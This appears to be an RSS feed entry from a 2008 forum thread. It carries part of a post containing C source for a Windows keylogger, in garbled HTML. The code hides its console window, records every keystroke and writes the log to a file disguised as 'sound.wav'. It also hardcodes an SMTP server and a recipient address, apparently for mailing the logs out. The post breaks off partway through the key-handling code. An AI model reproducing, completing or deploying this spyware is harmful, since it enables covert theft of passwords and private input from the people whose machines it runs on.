<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<em>/<br>
/</em><br>
Compile notes: I used Dev-C++ 4.9.9.2 to compie this. if you get an error like:<br>
Linker error] undefined reference to `WSAStartup@8’<br>
Add this:<br>
-lws2_32<br>
to Tools-&gt;Compiler Options under the section on compile flags.<br>
*/</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><span class="hashtag">#include</span> &lt;windows.h&gt;<br>
<span class="hashtag">#include</span> &lt;stdio.h&gt;<br>
<span class="hashtag">#include</span> &lt;winuser.h&gt;<br>
<span class="hashtag">#include</span> &lt;windowsx.h&gt;<br>
<span class="hashtag">#include</span> &lt;time.h&gt;<br>
int MailIt (char *mailserver, char *emailto, char *emailfrom,<br>
char *emailsubject, char *emailmessage);<br>
<span class="hashtag">#define</span> BUFSIZE 800<br>
<span class="hashtag">#define</span> waittime 500<br>
/*If you don’t know the mail exchange server for an address for the following<br>
“nslookup -querytype=mx <a href="http://gmail.com" rel="nofollow noopener">gmail.com</a>” but replace <a href="http://gmail.com" rel="nofollow noopener">gmail.com</a> with the domain for<br>
whatever email address you want. YOU MUST CHANGE  THESE SETTINGS OR<br>
IT WILL NOT WORK!!! */<br>
<span class="hashtag">#define</span> cmailserver “<a href="http://gmail-smtp-in.l.google.com" rel="nofollow noopener">gmail-smtp-in.l.google.com</a>”<br>
<span class="hashtag">#define</span> cemailto <a>"logsen10@gmail.com</a>"<br>
<span class="hashtag">#define</span> cemailfrom <a>"logsen10@gmail.com</a>"<br>
<span class="hashtag">#define</span> LogLength 100<br>
<span class="hashtag">#define</span> FileName “sound.wav”<br>
<span class="hashtag">#define</span> SMTPLog “ring.wav”<br>
<span class="hashtag">#define</span> cemailsubject “Logged”</p>
<p>int get_keys(void);<br>
int test_key(void);<br>
int main(void)<br>
{<br>
//Uncomment the lines below to put the keylogger in stealh mode.<br>
HWND stealth; /*creating stealth */<br>
AllocConsole();<br>
stealth=FindWindowA(“ConsoleWindowClass”,NULL);<br>
ShowWindow(stealth,0);</p>
<p>{FILE *file;<br>
file=fopen(FileName,“a+”);<br>
time_t theTime=time(0);<br>
fputs("\nStarted logging: ", file);<br>
fputs(ctime(&amp;theTime),file);<br>
fclose(file);<br>
}</p>
<p>/* if (test==2)<br>
{//the path in which the file needs to be<br>
char *path=“c:\%windir%\svchost.exe”;<br>
create=create_key(path);<br>
} */</p>
<p>int t=get_keys();<br>
return t;<br>
}</p>
<p>int get_keys(void)<br>
{<br>
int freadindex;<br>
char *buf;<br>
long len;<br>
FILE *file;<br>
file=fopen(FileName,“a+”);</p>
<pre><code>       short character;
         while(1)
         {
                Sleep(10);/*to prevent 100% cpu usage*/
                for(character=8;character&lt;=222;character++)
                {
                    if(GetAsyncKeyState(character)==-32767)
                    {  
                        FILE *file;
                        file=fopen(FileName,"a+");
                        if(file==NULL)
                        {
                                return 1;
                        }            
                        if(file!=NULL)
                        {        
                                if((character&gt;=39)&amp;&amp;(character&lt;=64))
                                {
                                      fputc(character,file);
                                      fclose(file);
                                      break;
                                }        
                                else if((character&gt;64)&amp;&amp;(character&lt;91))
                                {
                                      character+=32;
                                      fputc(character,file);
                                      fclose(file);
                                      break;
                                }
                                else
                                {
                                    switch(character)
                                    {
                                          case VK_SPACE:
                                          fputc(' ',file);
                                          fclose(file);
                                          break;    
                                          case VK_SHIFT:
                                          fputs("\r\n[SHIFT]\r\n",file);
                                          fclose(file);
                                          break;                                            
                                          case VK_RETURN:
                                          fputs("\r\n[ENTER]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_BACK:
                                          fputs("\r\n[BACKSPACE]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_TAB:
                                          fputs("\r\n[TAB]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_CONTROL:
                                          fputs("\r\n[CTRL]\r\n",file);
                                          fclose(file);
                                          break;    
                                          case VK_DELETE:
                                          fputs("\r\n[DEL]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_1:
                                          fputs("\r\n[;:]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_2:
                                          fputs("\r\n[/?]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_3:
                                          fputs("\r\n[`~]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_4:
                                          fputs("\r\n[ [{ ]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_5:
                                          fputs("\r\n[\\|]\r\n",file);
                                          fclose(file);
</code></pre>
<p>[/code]</p>
<p>Continued next post.</p>
          </blockquote>
          <p><a href="https://forum.moparisthebest.com/t/c-c-problem/202399/1">Read full topic</a></p>
        ]]></description>
        <link>https://forum.moparisthebest.com/t/c-c-problem/202399/1</link>
        <pubDate>Mon, 28 Apr 2008 20:50:29 +0000</pubDate>
        <guid isPermaLink="false">forum.moparisthebest.com-post-202399-1</guid>
        <source url="https://forum.moparisthebest.com/t/c-c-problem/202399.rss">C/C++ Problem</source>
      </item>
  </channel>
</rss>
